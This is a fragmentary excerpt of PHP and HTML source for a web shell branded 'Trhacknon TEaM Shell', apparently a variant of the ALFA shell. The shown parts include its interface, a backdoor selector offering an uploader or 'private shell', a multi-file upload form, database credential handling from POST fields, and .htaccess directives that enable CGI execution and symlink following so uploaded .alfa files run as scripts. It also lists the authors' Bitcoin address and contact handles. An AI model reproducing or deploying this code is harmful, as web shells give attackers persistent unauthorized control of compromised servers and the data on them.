...
<title>~ Trhacknon TEaM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2022" draggable="false" src="https://b.top4top.io/p_210130c5s0.gif" /></center>
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ Trhacknon TEaM Shell - v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ::..</title>
<style type="text/css">';?>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="trhacknon team 2012" draggable="false" src="https://b.top4top.io/p_210130c5s0.gif" /></td>
</tr>
<tr>
...
$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='alfa'>Trhacknon Team Uploader</option><option value='my'>My Private Shell</option></select>";
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='trhacknon-copyright'><span class='copyright'>[ ./TrhacknonTeam &copy; 2012-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1KLty8LUqnqsXkM3Qkvy2Kpv4gLt7Ugcyo\");' style='color: #E91E63;text-decoration: none;'>Expect Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>juliettakamorista[at]gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/@crazymarsupilami'>@crazymarsupilami</a></span></div></td>
</tr>
</table>
</div>
...
if($_POST['alfa8']=='>>'){
$s0levisible="Powered By Trhacknon";
$dbu = $_POST['alfa2'];
$dbn = $_POST['alfa3'];
$dbp = $_POST['alfa4'];
$dbh = $_POST['alfa5'];
...
if($m=='cgi'){
$code = "#Coded By Trhacknon & Invisible\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .alfa\nAddHandler cgi-script .alfa";
}elseif($m=='sym'){
